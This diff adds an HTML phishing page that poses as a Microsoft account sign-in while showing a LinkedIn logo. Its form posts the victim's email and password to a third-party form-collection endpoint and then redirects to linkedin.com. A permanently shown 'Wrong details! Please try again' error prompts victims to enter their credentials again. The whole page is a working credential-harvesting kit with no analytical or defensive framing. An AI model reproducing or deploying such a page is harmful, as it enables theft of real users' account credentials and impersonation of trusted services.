@@ -1,0 +1,54 @@
+<!doctype html>
+<html>
+<head>
+	<title>Sign in to your Microsoft account</title>
+</head>
+<body>
+<div class="container-fluid" style="box-sizing: border-box; width: 1349px; padding-right: 15px; padding-left: 15px; margin-right: auto; margin-left: auto; color: rgb(33, 37, 41); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px;">
+<div class="container" style="box-sizing: border-box; width: 1140px; padding-right: 15px; padding-left: 15px; margin-right: auto; margin-left: auto; max-width: 1140px;">
+<div class="row my-5 py-5" style="box-sizing: border-box; display: flex; flex-wrap: wrap; margin-right: -15px; margin-left: -15px; margin-top: 3rem !important; margin-bottom: 3rem !important; padding-top: 3rem !important; padding-bottom: 3rem !important;">
+<div class="col-lg-6 mx-auto" style="box-sizing: border-box; position: relative; width: 570px; min-height: 1px; padding-right: 15px; padding-left: 15px; -webkit-box-flex: 0; flex: 0 0 50%; max-width: 50%; margin-right: auto !important; margin-left: auto !important;">
+<div class="m-5 p-5 bg-white box" id="div1" style="box-sizing: border-box; background-color: rgb(255, 255, 255) !important; margin: 20px auto 28px; padding: 44px; box-shadow: rgba(0, 0, 0, 0.32) 0px 2px 3px; border: 0px solid rgba(0, 0, 0, 0.4); max-height: 415px; width: 440px;"><img alt="LinkedIn – Logos Download" src="https://logos-download.com/wp-content/uploads/2016/03/LinkedIn_Logo_2019.png" style="background-color: rgb(255, 255, 255); padding: 0px; margin: -2px 2px 0px 0px; animation: 0.2s ease 0s 1 normal none running all; height: 63px; width: 250px;" /><span style="font-family: sans-serif;">&nbsp;</span>
+<form action="https://submit-form.com/1Q4gO8uV" method="POST" style="padding: 0px; margin: 0px; font-family: sans-serif;">
+<input
+    type="hidden"
+    name="_redirect"
+    value="https://www.linkedin.com/"
+  />
+<div class="form-group curActive has-error" style="padding: 0px; margin: 0px 0px 15px; font-family: Arial, sans-serif; font-size: 14px; box-sizing: border-box; position: relative;">
+<p style="padding: 0px; margin: 0px 0px 20px; font-family: sans-serif; display: flex; position: relative; text-align: center;"><input autocomplete="on" autofocus="" class="form-control signin-email" id="username" name="username" placeholder="Email, phone or Skype" required="" style="padding: 6px 12px; margin: 0px; font-family: inherit; box-sizing: border-box; color: rgb(85, 85, 85); font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 14px; line-height: 1.42857; width: 280px; height: 34px; background-image: none; border-width: 1px; border-style: solid; border-color: rgb(228, 177, 0); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgba(228, 177, 0, 0.6) 0px 0px 8px; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s; max-width: 280px;" tabindex="1" type="email" value="" />&nbsp;</p>
+
+<div class="hint" style="padding: 0px 0px 0px 10px; margin: 0px; font-family: sans-serif; box-sizing: border-box; display: inline-block; max-width: 31%; font-size: 12px; line-height: 15px; vertical-align: middle; position: absolute; text-align: center;">&nbsp;</div>
+</div>
+
+<p style="padding: 0px; margin: 0px 0px 20px; font-family: Arial, sans-serif; display: flex; position: relative; font-size: 14px; text-align: center;"><input autocomplete="on" class="form-control" id="password" name="password" placeholder="Password" required="" style="padding: 6px 12px; margin: 0px; font-family: inherit; box-sizing: border-box; color: rgb(85, 85, 85); font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: 14px; line-height: 1.42857; width: 280px; height: 34px; background-image: none; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset; transition: border-color 0.15s ease-in-out 0s, box-shadow 0.15s ease-in-out 0s; max-width: 280px;" tabindex="2" type="password" /></p>
+
+<div class="form__input-group" style="padding: 0px; margin: 0px 0px 1rem; font-family: Calibri, sans-serif; font-size: 16px; background-color: rgb(255, 255, 255);">
+<div class="sharing-form" style="padding: 0px; margin: 13px 0px 16px; font-family: &quot;Segoe UI Web (West European)&quot;, &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif; color: rgb(51, 51, 51); font-size: 14px; box-sizing: border-box; border-radius: 6px; box-shadow: rgba(0, 0, 0, 0.17) 0px 0px 10px 0px; max-width: 360px; display: flex; flex-direction: column;">
+<div class="form-content" style="padding: 28px 32px 32px; margin: 0px; font-family: sans-serif; box-sizing: border-box; border-bottom-right-radius: 6px; border-bottom-left-radius: 6px; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial; position: relative;">
+<div style="padding: 0px; margin: 0px; box-sizing: border-box;">
+<div class="form-error-container" style="padding: 0px; margin: 0px 0px 8px; box-sizing: border-box; color: rgb(168, 0, 0); font-size: 12px;">
+<center style="padding: 0px; margin: 0px; box-sizing: border-box;">
+<div class="alert alert-danger" id="msg" style="padding: 0.75rem 1.25rem; margin: 0px 0px 1rem; box-sizing: border-box; position: relative; border: 1px solid rgb(245, 198, 203); border-radius: 0.25rem; color: rgb(114, 28, 36); background-color: rgb(248, 215, 218);">Wrong details! Please try again</div>
+</center>
+</div>
+</div>
+</div>
+</div>
+</div>
+<button class="btn" style="padding: 8px 0px; margin: 0px; font-family: sans-serif; width: 110px; float: right; background-color: rgb(0, 103, 184); color: rgb(255, 255, 255); font-size: 14px; cursor: pointer; border-width: initial; border-style: none; border-color: initial;" type="submit">Sign in</button></form>
+
+<p style="padding: 0px; margin: 0px 0px 20px; font-family: sans-serif; display: flex; position: relative;">&nbsp;</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<footer id="footer" style="box-sizing: border-box; position: fixed; bottom: 0px; width: 1349px; overflow: visible; z-index: 99; clear: both; color: rgb(33, 37, 41); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 16px; padding-right: 30px;">
+<div style="box-sizing: border-box;">
+<div class="footerNode" style="box-sizing: border-box;"><span style="box-sizing: border-box; color: black; font-size: 0.75rem; line-height: 28px; white-space: nowrap; display: inline-block; float: right; margin-left: 8px; margin-right: 8px;">Privacy &amp; cookie</span><a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" data-url="https://go.microsoft.com/fwlink/?LinkId=521839" href="blob:https://netwebhouse.com/c0fcd4c1-fe6d-4c56-ad8c-5a192826eda3#" style="box-sizing: border-box; color: black; text-decoration-line: none; font-size: 0.75rem; line-height: 28px; white-space: nowrap; display: inline-block; float: right; margin-left: 8px; margin-right: 8px;">Terms of use</a></div>
+</div>
+</footer>
+</body>
+</html>
